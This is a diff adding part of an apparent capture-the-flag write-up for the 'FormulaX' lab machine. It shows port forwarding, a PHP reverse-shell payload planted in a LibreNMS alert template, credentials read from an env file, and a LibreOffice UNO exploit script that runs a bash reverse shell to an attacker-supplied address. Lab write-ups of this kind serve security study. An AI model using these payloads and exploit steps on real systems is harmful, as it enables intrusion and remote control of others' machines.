@@ -162,6 +162,142 @@ Download chisel on frank machine
 
     chmod +x chisel 
 
+ssh -L 3000:127.0.0.1:3000 frank_dorky@10.10.11.6
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/1efc86fc-8634-4201-afd7-22ade3a90d25)
     
+![image](https://github.com/zer00d4y/writeups/assets/128820441/f8f6216b-cce5-410f-80b5-99dd349bfa08)
+
+Add new user 
+
+    frank_dorky@formulax:~$ cd /opt/librenms
+    frank_dorky@formulax:/opt/librenms$ ls -l adduser.php
+    -rwxr-xr-x 1 librenms librenms 956 Oct 18  2022 adduser.php
+    frank_dorky@formulax:/opt/librenms$ ./adduser.php test test 10
+    User test added successfully
+    frank_dorky@formulax:/opt/librenms$ 
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/c654f074-edd6-4bd8-914f-310372da5c7b)
+
+Login with `test`:`test` 
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/9b3c8870-c417-40e8-8e02-d209873f620d)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/d3225ea4-edd2-4ce3-99f7-593636bbf6a7)
+
+Add librenms in /etc/hosts
+
+    echo "127.0.0.1 librenms.com" | sudo tee -a /etc/hosts
+
+Open with domain name and login again
+
+Now Webserver is `Ok`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/9119c025-38c1-42dd-8ab4-b26f9dd774a9)
+
+Create new alert template
+
+http://librenms.com:3000/templates
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/9a2058a4-b246-40a2-a57b-83f025842d92)
+
+shell
+
+    @php
+    system("bash -c '/bin/bash -i >& /dev/tcp/your-ip/port 0>&1'");
+    @endphp
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/61151d6e-722c-4ce5-af01-a9f9cc60dde7)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/e26d7f96-a5dd-417e-a735-4c7107ea23cb)
+
+Open `.custom.env` file where located password
+
+    librenms@formulax:~$ cat .custom.env
+    cat .custom.env
+    APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
+    
+    DB_HOST=localhost
+    DB_DATABASE=librenms
+    DB_USERNAME=kai_relay
+    DB_PASSWORD=mychemicalformulaX
+    
+    #APP_URL=
+    NODE_ID=648b260eb18d2
+    VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
+    VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/bb396fd2-22d5-4465-80c7-b8dd91e52a13)
+
+### SSH
+
+ssh kai_relay@formulax.htb
+
+Password: `mychemicalformulaX`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/410619a4-6194-4d30-bb7f-869229596a60)
+
+office.sh
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/20dd4eb9-faa3-41e9-906a-401cc4399a19)
+
+Exploit 
+
+https://www.exploit-db.com/exploits/46544
+
+    import uno
+    from com.sun.star.system import XSystemShellExecute
+    import argparse
+    
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--host', help='host to connect to', dest='host', required=True)
+    parser.add_argument('--port', help='port to connect to', dest='port', required=True)
+    
+    args = parser.parse_args()
+    # Define the UNO component
+    localContext = uno.getComponentContext()
+    
+    # Define the resolver to use, this is used to connect with the API
+    resolver = localContext.ServiceManager.createInstanceWithContext(
+    				"com.sun.star.bridge.UnoUrlResolver", localContext )
+    
+    # Connect with the provided host on the provided target port
+    print("[+] Connecting to target...")
+    context = resolver.resolve(
+    	"uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host,args.port))
+        
+    # Issue the service manager to spawn the SystemShellExecute module and execute calc.exe
+    service_manager = context.ServiceManager
+    print("[+] Connected to {0}".format(args.host))
+    shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
+    shell_execute.execute("calc.exe", '',1)
+
+Create shell.sh 
+
+    bash -c '/bin/bash -i >& /dev/tcp/your-ip/port 0>&1'
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/1261b6f3-282d-45b2-bb5a-1948158be371)
+
+    chmod +x shell.sh
+
+Download shell on kai_relay machine
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/57ac86f5-c64d-47aa-81f6-6bdaaa060c63)
+
+Create exploit on kai_relay machine
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/d929bc58-9af9-4e8c-b35a-1e5fd5722e98)
+
+Create exploit.py
+
+    #! /usr/bin/env python3 
+    import uno
+    from com.sun.star.system import XSystemShellExecute 
+    
+    local = uno.getComponentContext()
+    resolver = local.ServiceManager.createInstanceWithContext("com.sun.star.bridge.UnoUrlResolver",  local)
+    context = resolver.resolve("uno:socket,host=localhost, port=2002;urp;StarOffice.ComponentContext")
+    rc = context.ServiceManager.createInstance("com.sun.star.system.SystemShellExecute")
+    rc.execute("bash","/shell.sh", 1)
 
 
